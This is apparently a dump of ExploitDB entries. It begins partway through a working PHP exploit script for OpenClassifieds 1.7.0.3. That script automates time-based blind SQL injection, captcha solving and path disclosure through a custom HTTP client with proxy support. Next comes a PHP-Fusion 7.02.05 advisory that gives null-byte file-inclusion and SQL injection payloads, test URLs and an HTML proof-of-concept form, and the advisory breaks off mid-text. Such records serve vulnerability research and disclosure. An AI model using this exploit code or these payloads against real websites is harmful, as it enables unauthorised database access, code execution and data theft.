if($this->send("case\r\n".sprintf($question,"0+".$cur)."<".$pos." when true then\r\nsleep(".$this->timeout.") end")){\r\n\t\t#}else if($this->send("if(least(".sprintf($question,$cur).",".$pos.")!=".$pos.",sleep(".$this->timeout."),0)")){\r\n                   #if this is true the value must be zero, or in the\r\ncase of ascii,  a null byte.\r\n                   if($pos==$floor+1){\r\n                        $found=true;\r\n                        #We have found the null terminator so we have\r\nfinnished our search for a string.\r\n                        if($length==0){\r\n                            $length=-1;\r\n                        }else{\r\n                            $result[]=$pos-1;\r\n                        }\r\n                    }else{\r\n                        $high=$pos-1;\r\n                    }\r\n                }else{\r\n                    #both greater than and less then where asked, so\r\nso then the answer is our guess $pos.\r\n                    $result[]=$pos;\r\n                    $found=true;\r\n                }\r\n                $pos=$low+(($high-$low)/2);\r\n            }\r\n            print(".");\r\n        }\r\n        return $result;\r\n    }\r\n    //Fire off the request\r\n    function send($quesiton){\r\n        //build the injected query.\r\n        $this->query($quesiton);\r\n        $start=time();\r\n        $resp=$this->http->send($this->url);\r\n        //backup_url is for set_get()\r\n        $this->url=$this->backup_url;\r\n        $this->request_count++;\r\n        return (time()-$start>=$this->timeout);\r\n    }\r\n    //retroGod RIP\r\n   function charEncode($string){\r\n\t$char="char(";\r\n\t$size=strlen($string);\r\n\tfor($x=0;$x<$size;$x++){\r\n\t\t$char.=ord($string[$x]).",";\r\n\t}\r\n\t$char[strlen($char)-1]=")%00";\r\n\treturn $char;\r\n   }\r\n}\r\n\r\n//General purpose http client that works on a default php install.\r\n(curl not required)\r\nclass http_client{\r\n    var $proxy_ip=\'\', $proxy_port=\'\', $proxy_name=\'\', $proxy_pass=\'\',\r\n$referer=\'\',$cookie=\'\',$postdata=\'\';\r\n    function send($loc){\r\n         //overload function polymorphism between gets and posts\r\n         $url=parse_url($loc);\r\n         if(!isset($url[\'port\'])){\r\n            $url[\'port\']=80;\r\n        }\r\n         $ua=\'Firefox\';\r\n         if($this->proxy_ip!=\'\'&&$this->proxy_port!=\'\'){\r\n            $fp = pfsockopen( $this->proxy_ip, $this->proxy_port,\r\n&$errno, &$errstr, 120 );\r\n            $url[\'path\']=$url[\'host\'].\':\'.$url[\'port\'].$url[\'path\'];\r\n         }else{\r\n            $fp = fsockopen( $url[\'host\'], $url[\'port\'], &$errno,\r\n&$errstr, 120 );\r\n         }\r\n         if( !$fp ) {\r\n            print "$errstr ($errno)<br>\\nn";\r\n            return false;\r\n         } else {\r\n\t    if(@!$url[\'query\']){\r\n\t\t$url[\'query\']=\'\';\r\n\t    }\r\n            if( $this->postdata==\'\' ) {\r\n                $request="GET ".$url[\'path\']."?".$url[\'query\']." HTTP/1.1\\r\\n";\r\n            } else {\r\n                $request="POST ".$url[\'path\']."?".$url[\'query\']." HTTP/1.1\\r\\n";\r\n            }\r\n            if($this->proxy_name!=\'\'&&$this->proxy_pass!=\'\'){\r\n                $request.="Proxy-Authorization: Basic\r\n".base64_encode($this->proxy_name.":".$this->proxy_pass)."\\r\\n\\r\\n";\r\n            }\r\n            $request.="Host: ".$url[\'host\'].":".$url[\'port\']."\\r\\n";\r\n            $request.="User-Agent: ".$ua."\\r\\n";\r\n            $request.="Accept: text/plain\\r\\n";\r\n            if($this->referer!=\'\'){\r\n                $request.="Referer: ".$this->referer."\\r\\n";\r\n            }\r\n            $request.="Connection: Close\\r\\n";\r\n            if($this->cookie!=\'\'){\r\n                $request.="Cookie: ".$this->cookie."\\r\\n" ;\r\n            }\r\n            if( $this->postdata!=\'\' ) {\r\n                $strlength = strlen( $this->postdata );\r\n                $request.="Content-type:\r\napplication/x-www-form-urlencoded\\r\\n" ;\r\n                $request.="Content-length: ".$strlength."\\r\\n\\r\\n";\r\n                $request.=$this->postdata;\r\n            }\r\n            fputs( $fp, $request."\\r\\n\\r\\n" );\r\n            $output=\'\';\r\n\t    while( !feof( $fp ) ) {\r\n                   $output .= fgets( $fp, 1024 );\r\n\t    }\r\n            fclose( $fp );\r\n\t    $header=explode("\\r\\n\\r\\n",$output);\r\n\t    if(strstr($header[0],"Set-Cookie: ") && $this->cookie==\'\'){\r\n\t\t$cookie=explode("Set-Cookie: ",$header[0]);\r\n\t\t$cookie=explode("\\n",$cookie[1]);\r\n\t\t$cookie=explode(";",$cookie[0]);\r\n\t\t$this->cookie=trim($cookie[0]);\r\n\t    }\r\n\t    if(strstr($output,"Query:")){\r\n\t\tdie($output);\r\n\t    }\r\n\t    return $output;\r\n         }\r\n    }\r\n    //Use a http proxy\r\n    function proxy($proxy){ //user:pass@ip:port\r\n        $proxyAuth=explode(\'@\',$proxy);\r\n        if(isset($proxyAuth[1])){\r\n            $login=explode(\':\',$proxyAuth[0]);\r\n            $this->proxy_name=$login[0];\r\n            $this->proxy_pass=$login[1];\r\n            $addr=explode(\':\',$proxyAuth[1]);\r\n        }else{\r\n            $addr=explode(\':\',$proxy);\r\n        }\r\n         $this->proxy_ip=$addr[0];\r\n        $this->proxy_port=$addr[1];\r\n    }\r\n    //Parses the results from a PHP error to use as a path disclosure.\r\n    function getPath($url,$pops=1){\r\n        $html=$this->send($url);\r\n        //Regular error reporting:\r\n        $resp=explode("array given in <b>",$html);\r\n        if(isset($resp[1])){\r\n            $resp = explode("</b>",$resp[1]);\r\n        }else{\r\n            //xdebug\'s error reporting:\r\n            $resp=explode("array given in ",$html);\r\n            if(isset($resp[1])){\r\n                $resp = explode(" ",$resp[1]);\r\n            }else{\r\n                $resp[0]=false;\r\n            }\r\n        }\r\n        $path=$resp[0];\r\n        //Can\'t use dirname()\r\n        if(strstr($path,"\\\\")){\r\n           $p=explode("\\\\",$path);\r\n           for($x=0;$x<$pops;$x++){\r\n               array_pop($p);\r\n           }\r\n           $path=implode("\\\\",$p);\r\n        }else{\r\n           $p=explode("/",$path);\r\n           for($x=0;$x<$pops;$x++){\r\n               array_pop($p);\r\n           }\r\n           $path=implode("/",$p);\r\n        }\r\n        return $path;\r\n    }\r\n    //Grab the server type from the http header.\r\n    function getServer($url){\r\n        $resp=$this->send($url);\r\n        $header=explode("Server: ",$resp);\r\n        $server=explode("\\n",$header[1]);\r\n        return $server[0];\r\n    }\r\n}\r\n\r\n#used to evaluate the captcha. 1+2=3\r\n class EvalMath {\r\n\r\n                var $suppress_errors = false;\r\n                var $last_error = null;\r\n\r\n                var $v = array(\'e\'=>2.71,\'pi\'=>3.14); // variables\r\n(and constants)\r\n                var $f = array(); // user-defined functions\r\n                var $vb = array(\'e\', \'pi\'); // constants\r\n                var $fb = array(  // built-in functions\r\n                        \'sin\',\'sinh\',\'arcsin\',\'asin\',\'arcsinh\',\'asinh\',\r\n                        \'cos\',\'cosh\',\'arccos\',\'acos\',\'arccosh\',\'acosh\',\r\n                        \'tan\',\'tanh\',\'arctan\',\'atan\',\'arctanh\',\'atanh\',\r\n                        \'sqrt\',\'abs\',\'ln\',\'log\');\r\n\r\n                function EvalMath() {\r\n                        // make the variables a little more accurate\r\n                        $this->v[\'pi\'] = pi();\r\n                        $this->v[\'e\'] = exp(1);\r\n                }\r\n\r\n                function e($expr) {\r\n                        return $this->evaluate($expr);\r\n                }\r\n\r\n                function evaluate($expr) {\r\n                        $this->last_error = null;\r\n                        $expr = trim($expr);\r\n                        if (substr($expr, -1, 1) == \';\') $expr =\r\nsubstr($expr, 0, strlen($expr)-1); // strip semicolons at the end\r\n                        //===============\r\n                        // is it a variable assignment?\r\n                        if (preg_match(\'/^\\s*([a-z]\\w*)\\s*=\\s*(.+)$/\',\r\n$expr, $matches)) {\r\n                                if (in_array($matches[1], $this->vb))\r\n{ // make sure we\'re not assigning to a constant\r\n                                        return $this->trigger("cannot\r\nassign to constant \'$matches[1]\'");\r\n                                }\r\n                                if (($tmp =\r\n$this->pfx($this->nfx($matches[2]))) === false) return false; // get\r\nthe result and make sure it\'s good\r\n                                $this->v[$matches[1]] = $tmp; // if\r\nso, stick it in the variable array\r\n                                return $this->v[$matches[1]]; // and\r\nreturn the resulting value\r\n                        //===============\r\n                        // is it a function assignment?\r\n                        } elseif\r\n(preg_match(\'/^\\s*([a-z]\\w*)\\s*\\(\\s*([a-z]\\w*(?:\\s*,\\s*[a-z]\\w*)*)\\s*\\)\\s*=\\s*(.+)$/\',\r\n$expr, $matches)) {\r\n                                $fnn = $matches[1]; // get the function name\r\n                                if (in_array($matches[1], $this->fb))\r\n{ // make sure it isn\'t built in\r\n                                        return $this->trigger("cannot\r\nredefine built-in function \'$matches[1]()\'");\r\n                                }\r\n                                $args = explode(",",\r\npreg_replace("/\\s+/", "", $matches[2])); // get the arguments\r\n                                if (($stack = $this->nfx($matches[3]))\r\n=== false) return false; // see if it can be converted to postfix\r\n                                for ($i = 0; $i<count($stack); $i++) {\r\n// freeze the state of the non-argument variables\r\n                                        $token = $stack[$i];\r\n                                        if (preg_match(\'/^[a-z]\\w*$/\',\r\n$token) and !in_array($token, $args)) {\r\n                                                if\r\n(array_key_exists($token, $this->v)) {\r\n                                                        $stack[$i] =\r\n$this->v[$token];\r\n                                                } else {\r\n                                                        return\r\n$this->trigger("undefined variable \'$token\' in function definition");\r\n                                                }\r\n                                        }\r\n                                }\r\n                                $this->f[$fnn] = array(\'args\'=>$args,\r\n\'func\'=>$stack);\r\n                                return true;\r\n                        //===============\r\n                        } else {\r\n                                return $this->pfx($this->nfx($expr));\r\n// straight up evaluation, woo\r\n                        }\r\n                }\r\n\r\n                function vars() {\r\n                        $output = $this->v;\r\n                        unset($output[\'pi\']);\r\n                        unset($output[\'e\']);\r\n                        return $output;\r\n                }\r\n\r\n                function funcs() {\r\n                        $output = array();\r\n                        foreach ($this->f as $fnn=>$dat)\r\n                                $output[] = $fnn . \'(\' . implode(\',\',\r\n$dat[\'args\']) . \')\';\r\n                        return $output;\r\n                }\r\n\r\n                //===================== HERE BE INTERNAL METHODS\r\n====================\\\\\r\n\r\n                // Convert infix to postfix notation\r\n                function nfx($expr) {\r\n\r\n                        $index = 0;\r\n                        $stack = new EvalMathStack;\r\n                        $output = array(); // postfix form of\r\nexpression, to be passed to pfx()\r\n                        $expr = trim(strtolower($expr));\r\n\r\n                        $ops   = array(\'+\', \'-\', \'*\', \'/\', \'^\', \'_\');\r\n                        $ops_r =\r\narray(\'+\'=>0,\'-\'=>0,\'*\'=>0,\'/\'=>0,\'^\'=>1); // right-associative\r\noperator?\r\n                        $ops_p =\r\narray(\'+\'=>0,\'-\'=>0,\'*\'=>1,\'/\'=>1,\'_\'=>1,\'^\'=>2); // operator\r\nprecedence\r\n\r\n                        $expecting_op = false; // we use this in\r\nsyntax-checking the expression\r\n                                                                   //\r\nand determining when a - is a negation\r\n\r\n                        if (preg_match("/[^\\w\\s+*^\\/()\\.,-]/", $expr,\r\n$matches)) { // make sure the characters are all good\r\n                                return $this->trigger("illegal\r\ncharacter \'{$matches[0]}\'");\r\n                        }\r\n\r\n                        while(1) { // 1 Infinite Loop ;)\r\n                                $op = substr($expr, $index, 1); // get\r\nthe first character at the current index\r\n                                // find out if we\'re currently at the\r\nbeginning of a number/variable/function/parenthesis/operand\r\n                                $ex =\r\npreg_match(\'/^([a-z]\\w*\\(?|\\d+(?:\\.\\d*)?|\\.\\d+|\\()/\', substr($expr,\r\n$index), $match);\r\n                                //===============\r\n                                if ($op == \'-\' and !$expecting_op) {\r\n// is it a negation instead of a minus?\r\n                                        $stack->push(\'_\'); // put a\r\nnegation on the stack\r\n                                        $index++;\r\n                                } elseif ($op == \'_\') { // we have to\r\nexplicitly deny this, because it\'s legal on the stack\r\n                                        return $this->trigger("illegal\r\ncharacter \'_\'"); // but not in the input expression\r\n                                //===============\r\n                                } elseif ((in_array($op, $ops) or $ex)\r\nand $expecting_op) { // are we putting an operator on the stack?\r\n                                        if ($ex) { // are we expecting\r\nan operator but have a number/variable/function/opening parethesis?\r\n                                                $op = \'*\'; $index--;\r\n// it\'s an implicit multiplication\r\n                                        }\r\n                                        // heart of the algorithm:\r\n                                        while($stack->count > 0 and\r\n($o2 = $stack->last()) and in_array($o2, $ops) and ($ops_r[$op] ?\r\n$ops_p[$op] < $ops_p[$o2] : $ops_p[$op] <= $ops_p[$o2])) {\r\n                                                $output[] =\r\n$stack->pop(); // pop stuff off the stack into the output\r\n                                        }\r\n                                        // many thanks:\r\nhttp://en.wikipedia.org/wiki/Reverse_Polish_notation#The_algorithm_in_detail\r\n                                        $stack->push($op); // finally\r\nput OUR operator onto the stack\r\n                                        $index++;\r\n                                        $expecting_op = false;\r\n                                //===============\r\n                                } elseif ($op == \')\' and\r\n$expecting_op) { // ready to close a parenthesis?\r\n                                        while (($o2 = $stack->pop())\r\n!= \'(\') { // pop off the stack back to the last (\r\n                                                if (is_null($o2))\r\nreturn $this->trigger("unexpected \')\'");\r\n                                                else $output[] = $o2;\r\n                                        }\r\n                                        if\r\n(preg_match("/^([a-z]\\w*)\\($/", $stack->last(2), $matches)) { // did\r\nwe just close a function?\r\n                                                $fnn = $matches[1]; //\r\nget the function name\r\n                                                $arg_count =\r\n$stack->pop(); // see how many arguments there were (cleverly stored\r\non the stack, thank you)\r\n                                                $output[] =\r\n$stack->pop(); // pop the function and push onto the output\r\n                                                if (in_array($fnn,\r\n$this->fb)) { // check the argument count\r\n                                                        if($arg_count > 1)\r\n                                                                return\r\n$this->trigger("too many arguments ($arg_count given, 1 expected)");\r\n                                                } elseif\r\n(array_key_exists($fnn, $this->f)) {\r\n                                                        if ($arg_count\r\n!= count($this->f[$fnn][\'args\']))\r\n                                                                return\r\n$this->trigger("wrong number of arguments ($arg_count given, " .\r\ncount($this->f[$fnn][\'args\']) . " expected)");\r\n                                                } else { // did we\r\nsomehow push a non-function on the stack? this should never happen\r\n                                                        return\r\n$this->trigger("internal error");\r\n                                                }\r\n                                        }\r\n                                        $index++;\r\n                                //===============\r\n                                } elseif ($op == \',\' and\r\n$expecting_op) { // did we just finish a function argument?\r\n                                        while (($o2 = $stack->pop()) != \'(\') {\r\n                                                if (is_null($o2))\r\nreturn $this->trigger("unexpected \',\'"); // oops, never had a (\r\n                                                else $output[] = $o2;\r\n// pop the argument expression stuff and push onto the output\r\n                                        }\r\n                                        // make sure there was a function\r\n                                        if\r\n(!preg_match("/^([a-z]\\w*)\\($/", $stack->last(2), $matches))\r\n                                                return\r\n$this->trigger("unexpected \',\'");\r\n                                        $stack->push($stack->pop()+1);\r\n// increment the argument count\r\n                                        $stack->push(\'(\'); // put the\r\n( back on, we\'ll need to pop back to it again\r\n                                        $index++;\r\n                                        $expecting_op = false;\r\n                                //===============\r\n                                } elseif ($op == \'(\' and !$expecting_op) {\r\n                                        $stack->push(\'(\'); // that was easy\r\n                                        $index++;\r\n                                        $allow_neg = true;\r\n                                //===============\r\n                                } elseif ($ex and !$expecting_op) { //\r\ndo we now have a function/variable/number?\r\n                                        $expecting_op = true;\r\n                                        $val = $match[1];\r\n                                        if\r\n(preg_match("/^([a-z]\\w*)\\($/", $val, $matches)) { // may be func, or\r\nvariable w/ implicit multiplication against parentheses...\r\n                                                if\r\n(in_array($matches[1], $this->fb) or array_key_exists($matches[1],\r\n$this->f)) { // it\'s a func\r\n                                                        $stack->push($val);\r\n                                                        $stack->push(1);\r\n                                                        $stack->push(\'(\');\r\n                                                        $expecting_op = false;\r\n                                                } else { // it\'s a var\r\nw/ implicit multiplication\r\n                                                        $val = $matches[1];\r\n                                                        $output[] = $val;\r\n                                                }\r\n                                        } else { // it\'s a plain old var or num\r\n                                                $output[] = $val;\r\n                                        }\r\n                                        $index += strlen($val);\r\n                                //===============\r\n                                } elseif ($op == \')\') { //\r\nmiscellaneous error checking\r\n                                        return $this->trigger("unexpected \')\'");\r\n                                } elseif (in_array($op, $ops) and\r\n!$expecting_op) {\r\n                                        return\r\n$this->trigger("unexpected operator \'$op\'");\r\n                                } else { // I don\'t even want to know\r\nwhat you did to get here\r\n                                        return $this->trigger("an\r\nunexpected error occured");\r\n                                }\r\n                                if ($index == strlen($expr)) {\r\n                                        if (in_array($op, $ops)) { //\r\ndid we end with an operator? bad.\r\n                                                return\r\n$this->trigger("operator \'$op\' lacks operand");\r\n                                        } else {\r\n                                                break;\r\n                                        }\r\n                                }\r\n                                while (substr($expr, $index, 1) == \'\r\n\') { // step the index past whitespace (pretty much turns whitespace\r\n                                        $index++;\r\n       // into implicit multiplication if no operator is there)\r\n                                }\r\n\r\n                        }\r\n                        while (!is_null($op = $stack->pop())) { // pop\r\neverything off the stack and push onto output\r\n                                if ($op == \'(\') return\r\n$this->trigger("expecting \')\'"); // if there are (s on the stack, ()s\r\nwere unbalanced\r\n                                $output[] = $op;\r\n                        }\r\n                        return $output;\r\n                }\r\n\r\n                // evaluate postfix notation\r\n                function pfx($tokens, $vars = array()) {\r\n\r\n                        if ($tokens == false) return false;\r\n\r\n                        $stack = new EvalMathStack;\r\n\r\n                        foreach ($tokens as $token) { // nice and easy\r\n                                // if the token is a binary operator,\r\npop two values off the stack, do the operation, and push the result\r\nback on\r\n                                if (in_array($token, array(\'+\', \'-\',\r\n\'*\', \'/\', \'^\'))) {\r\n                                        if (is_null($op2 =\r\n$stack->pop())) return $this->trigger("internal error");\r\n                                        if (is_null($op1 =\r\n$stack->pop())) return $this->trigger("internal error");\r\n                                        switch ($token) {\r\n                                                case \'+\':\r\n\r\n$stack->push($op1+$op2); break;\r\n                                                case \'-\':\r\n\r\n$stack->push($op1-$op2); break;\r\n                                                case \'*\':\r\n\r\n$stack->push($op1*$op2); break;\r\n                                                case \'/\':\r\n                                                        if ($op2 == 0)\r\nreturn $this->trigger("division by zero");\r\n\r\n$stack->push($op1/$op2); break;\r\n                                                case \'^\':\r\n\r\n$stack->push(pow($op1, $op2)); break;\r\n                                        }\r\n                                // if the token is a unary operator,\r\npop one value off the stack, do the operation, and push it back on\r\n                                } elseif ($token == "_") {\r\n                                        $stack->push(-1*$stack->pop());\r\n                                // if the token is a function, pop\r\narguments off the stack, hand them to the function, and push the\r\nresult back on\r\n                                } elseif\r\n(preg_match("/^([a-z]\\w*)\\($/", $token, $matches)) { // it\'s a\r\nfunction!\r\n                                        $fnn = $matches[1];\r\n                                        if (in_array($fnn, $this->fb))\r\n{ // built-in function:\r\n                                                if (is_null($op1 =\r\n$stack->pop())) return $this->trigger("internal error");\r\n                                                $fnn =\r\npreg_replace("/^arc/", "a", $fnn); // for the \'arc\' trig synonyms\r\n                                                if ($fnn == \'ln\') $fnn = \'log\';\r\n                                                eval(\'$stack->push(\' .\r\n$fnn . \'($op1));\'); // perfectly safe eval()\r\n                                        } elseif\r\n(array_key_exists($fnn, $this->f)) { // user function\r\n                                                // get args\r\n                                                $args = array();\r\n                                                for ($i =\r\ncount($this->f[$fnn][\'args\'])-1; $i >= 0; $i--) {\r\n                                                        if\r\n(is_null($args[$this->f[$fnn][\'args\'][$i]] = $stack->pop())) return\r\n$this->trigger("internal error");\r\n                                                }\r\n\r\n$stack->push($this->pfx($this->f[$fnn][\'func\'], $args)); // yay...\r\nrecursion!!!!\r\n                                        }\r\n                                // if the token is a number or\r\nvariable, push it on the stack\r\n                                } else {\r\n                                        if (is_numeric($token)) {\r\n                                                $stack->push($token);\r\n                                        } elseif\r\n(array_key_exists($token, $this->v)) {\r\n                                                $stack->push($this->v[$token]);\r\n                                        } elseif\r\n(array_key_exists($token, $vars)) {\r\n                                                $stack->push($vars[$token]);\r\n                                        } else {\r\n                                                return\r\n$this->trigger("undefined variable \'$token\'");\r\n                                        }\r\n                                }\r\n                        }\r\n                        // when we\'re out of tokens, the stack should\r\nhave a single element, the final result\r\n                        if ($stack->count != 1) return\r\n$this->trigger("internal error");\r\n                        return $stack->pop();\r\n                }\r\n\r\n                // trigger an error, but nicely, if need be\r\n                function trigger($msg) {\r\n                        $this->last_error = $msg;\r\n                        if (!$this->suppress_errors)\r\ntrigger_error($msg, E_USER_WARNING);\r\n                        return false;\r\n                }\r\n        }\r\n\r\n        // for internal use\r\n        class EvalMathStack {\r\n\r\n                var $stack = array();\r\n                var $count = 0;\r\n\r\n                function push($val) {\r\n                        $this->stack[$this->count] = $val;\r\n                        $this->count++;\r\n                }\r\n\r\n                function pop() {\r\n                        if ($this->count > 0) {\r\n                                $this->count--;\r\n                                return $this->stack[$this->count];\r\n                        }\r\n                        return null;\r\n                }\r\n\r\n                function last($n=1) {\r\n                        return $this->stack[$this->count-$n];\r\n                }\r\n        }\r\n\t\r\nmain();\r\n?>', u'description': u'OpenClassifieds 1.7.0.3 - Chained: Captcha Bypass / SQL Injection / Persistent Cross-Site Scripting on FrontPage', u'platform': u'php', u'author': u'Michael Brooks', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-12-28T00:00:00+00:00', u'_id': 15838, u'type': u'webapps', u'port': 0}

CVE: []
Description: PHP-Fusion 7.02.05 - Multiple Vulnerabilities
{u'code': u'[waraxe-2013-SA#097] - Multiple Vulnerabilities in PHP-Fusion 7.02.05\r\n===============================================================================\r\n\r\nAuthor: Janek Vind "waraxe"\r\nDate: 27. February 2013\r\nLocation: Estonia, Tartu\r\nWeb: http://www.waraxe.us/advisory-97.html\r\n\r\n\r\nDescription of vulnerable software:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nPHP-Fusion is a light-weight open-source content management system (CMS)\r\nwritten in PHP 5. It utilises a MySQL database to store your site content and\r\nincludes a simple, comprehensive administration system. PHP-Fusion includes the\r\nmost common features you would expect to see in many other CMS packages. \r\n\r\nhttp://www.php-fusion.co.uk/news.php\r\nhttp://sourceforge.net/projects/php-fusion/\r\n\r\nVulnerable is version 7.02.05 and possibly older versions.\r\n\r\nNew, patched version 7.02.06 available here:\r\n\r\nhttp://www.php-fusion.co.uk/news.php?readmore=569\r\nhttp://www.php-fusion.co.uk/downloads.php?cat_id=23&download_id=264\r\n\r\n\r\n###############################################################################\r\n1. Local File Inclusion in "maincore.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied POST parameter "user_theme"\r\nPreconditions:\r\n 1. Logged in as valid user\r\n 2. "Allow users to change theme" option must be activated (it is by default)\r\n 3. PHP must be < 5.3.4 for null-byte attacks to work\r\n \r\nPHP-Fusion users can edit their profile and by default there is possibility to\r\nchange the theme. There is no sufficient sanitization of the POST parameter\r\n"user_theme":\r\n\r\nPhp script "includes/user_fields/user_theme_include" line 41:\r\n------------------------[ source code start ]----------------------------------\r\n} elseif ($profile_method == "validate_insert"  || $profile_method == "validate_update") {\r\n    if ($settings[\'userthemes\'] == 1 || iADMIN) {\r\n        // Get input data\r\n        if (isset($_POST[\'user_theme\']) && $_POST[\'user_theme\'] != "") {\r\n            // Set update or insert user data\r\n            $this->_setDBValue("user_theme", stripinput(trim($_POST[\'user_theme\'])));\r\n------------------------[ source code end ]------------------------------------\r\n\r\nWe can see, that user-supplied parameter "user_theme" goes through the\r\nfunction "stripinput()":\r\n\r\nPhp script "maincore.php" line 332:\r\n------------------------[ source code start ]----------------------------------\r\n// Strip Input Function, prevents HTML in unwanted places\r\nfunction stripinput($text) {\r\n    if (!is_array($text)) {\r\n        $text = stripslash(trim($text));\r\n        $text = preg_replace("/(&)+(?=\\#([0-9]{2,3});)/i", "&", $text);\r\n        $search = array("&", "\\"", "\'", "\\\\", \'\\"\', "\\\'", "<", ">", "&nbsp;");\r\n        $replace = array("&", """, "\'", "\\", """, "\'", "<", ">", " ");\r\n        $text = str_replace($search, $replace, $text);\r\n    } else {\r\n        foreach ($text as $key => $value) {\r\n            $text[$key] = stripinput($value);\r\n        }\r\n    }\r\n    return $text;\r\n}\r\n------------------------[ source code end ]------------------------------------\r\n\r\nThis function works against XSS and SQL Injection attacks, but not against\r\nfile inclusion attacks. Attacker can submit user theme value as one below:\r\n\r\n../images/avatars/waraxe.jpg\\0z\r\n\r\nDirectory traversal symbols "../" and null byte will pass through the\r\nfunction "stripinput()" and whole string will be saved to the database.\r\nAll subsequent requests by attacker will use this malicious theme string\r\nand as result, previously uploaded avatar picture with PHP payload gets\r\nincluded and executed.\r\n\r\nMost front-end scripts start with this:\r\n------------------------[ source code start ]----------------------------------\r\nrequire_once "maincore.php";\r\nrequire_once THEMES."templates/header.php";\r\n------------------------[ source code end ]------------------------------------\r\n\r\nPhp script "maincore.php" line 264:\r\n------------------------[ source code start ]----------------------------------\r\n// Set theme\r\nif (!theme_exists($userdata[\'user_theme\'])) {\r\n...\r\n// Check that site or user theme exists\r\nfunction theme_exists($theme) {\r\n    global $settings;\r\n...\r\n    } elseif (file_exists(THEMES.$theme."/theme.php") && file_exists(THEMES.$theme."/styles.css")) {\r\n        define("THEME", THEMES.$theme."/");\r\n------------------------[ source code end ]------------------------------------\r\n\r\nWe can see, that malicious theme string from database will be used in theme path\r\ndefinition and later is used in "require_once".\r\n\r\nThis security vulnerability was tested by using Burp Proxy and exploitation\r\nsucceeded.\r\n\r\n###############################################################################\r\n2. Local File Inclusion in "administration/user_fields.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied GET parameter "enable"\r\nPreconditions:\r\n 1. Logged in as admin with user field administration privileges\r\n 2. PHP must be < 5.3.4 for null-byte attacks to work\r\n \r\n \r\nPhp script "administration/user_fields.php" line 84:\r\n------------------------[ source code start ]----------------------------------\r\n} elseif (isset($_GET[\'enable\'])\r\n        && file_exists(INCLUDES."user_fields/".stripinput($_GET[\'enable\'])."_include_var.php")\r\n        && file_exists(INCLUDES."user_fields/".stripinput($_GET[\'enable\'])."_include.php")\r\n) {\r\n    $user_field_api_version = "1.00.00";\r\n    if (file_exists(LOCALE.LOCALESET."user_fields/".stripinput($_GET[\'enable\']).".php")) {\r\n        include LOCALE.LOCALESET."user_fields/".stripinput($_GET[\'enable\']).".php";\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "aid" needs to be valid):\r\n\r\nUpload avatar picture with PHP payload and then issue request:\r\n\r\nhttp://localhost/phpfusion70205/administration/user_fields.php?\r\naid=e017e24eb00e8ccf&enable=../../images/avatars/waraxe.jpg%00z\r\n\r\n\r\n###############################################################################\r\n3. SQL Injection in "includes/classes/Authenticate.class.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied HTTP cookie\r\nPreconditions:\r\n 1. magic_quotes_gpc=off \r\n \r\n \r\nPhp script "includes/classes/Authenticate.class.php" line 143:\r\n------------------------[ source code start ]----------------------------------\r\n// Validate authenticated user\r\n public static function validateAuthUser($userCookie = true) {\r\n\r\n  if (isset($_COOKIE[COOKIE_USER]) && $_COOKIE[COOKIE_USER] != "") {\r\n   $cookieDataArr = explode(".", $_COOKIE[COOKIE_USER]);\r\n\r\n   if (count($cookieDataArr) == 3) {\r\n    list($userID, $cookieExpiration, $cookieHash) = $cookieDataArr;\r\n\r\n    if ($cookieExpiration > time()) {\r\n     $result = dbquery(\r\n      "SELECT * FROM ".DB_USERS."\r\n      WHERE user_id=\'".$userID."\' AND user_status=\'0\' AND user_actiontime=\'0\'\r\n      LIMIT 1"\r\n     );\r\n------------------------[ source code end ]------------------------------------\r\n\r\nWe can see, that user-supplied cookie will be exploded to three parts and\r\nfirst part, "userID" is used in SQL query without any sanitization, which\r\nleads to SQL Injection vulnerability.\r\n\r\n\r\n###############################################################################\r\n4. SQL Injection in "downloads.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied GET parameter "orderby"\r\nPreconditions:\r\n 1. valid download category with at least one download\r\n \r\nPhp script "downloads.php" line 111:\r\n------------------------[ source code start ]----------------------------------\r\nif (isset($_GET[\'orderby\'])) {\r\n    $order_by = stripinput($_GET[\'orderby\']);\r\n...\r\n$result = dbquery(\r\n "SELECT td.download_id, td.download_user, td.download_datestamp,\r\n...\r\n ORDER BY ".($order_by == "" ? $cat_data[\'download_cat_sorting\'] : $order_by." ".$sort)."\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTests:\r\n\r\nhttp://localhost/phpfusion70205/downloads.php?cat_id=1&orderby=waraxe\r\n\r\n"Unknown column \'waraxe\' in \'order clause\'"\r\n\r\nhttp://localhost/phpfusion70205/downloads.php?cat_id=1&orderby=IF(0,1,(SELECT+1+UNION+SELECT+2))\r\n\r\nResult: error message "Subquery returns more than 1 row"\r\n\r\nhttp://localhost/phpfusion70205/downloads.php?cat_id=1&orderby=IF(1,1,(SELECT+1+UNION+SELECT+2))\r\n\r\nResult: normal page\r\n\r\n\r\n###############################################################################\r\n5. SQL Injection in "forum/postedit.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied POST parameter "delete_attach_*"\r\nPreconditions:\r\n 1. Logged in as user with forum posting privileges\r\n 2. magic_quotes_gpc=off\r\n \r\n \r\nPhp script "forum/postedit.php" line 219:\r\n------------------------[ source code start ]----------------------------------\r\nforeach ($_POST as $key=>$value){\r\n if(!strstr($key, "delete_attach")) continue;\r\n $key = str_replace("delete_attach_", "", $key);\r\n $result = dbquery("SELECT * FROM ".DB_FORUM_ATTACHMENTS." WHERE post_id=\'".$_GET[\'post_id\']."\' and attach_id=\'$key\'");\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameters "forum_id", "thread_id" and "post_id" must be valid):\r\n\r\n-------------------------[ test code start ]-----------------------------------\r\n<html><body><center>\r\n<form action="http://localhost/phpfusion70205/forum/post.php?action=edit&forum_id=2&thread_id=1&post_id=1" method="post">\r\n<input type="hidden" name="savechanges" value="1">\r\n<input type="hidden" name="message" value="Testing">\r\n<input type="hidden" name="delete_attach_war\'axe" value="1">\r\n<input type="submit" value="Test">\r\n</form>\r\n</center></body></html>\r\n--------------------------[ test code end 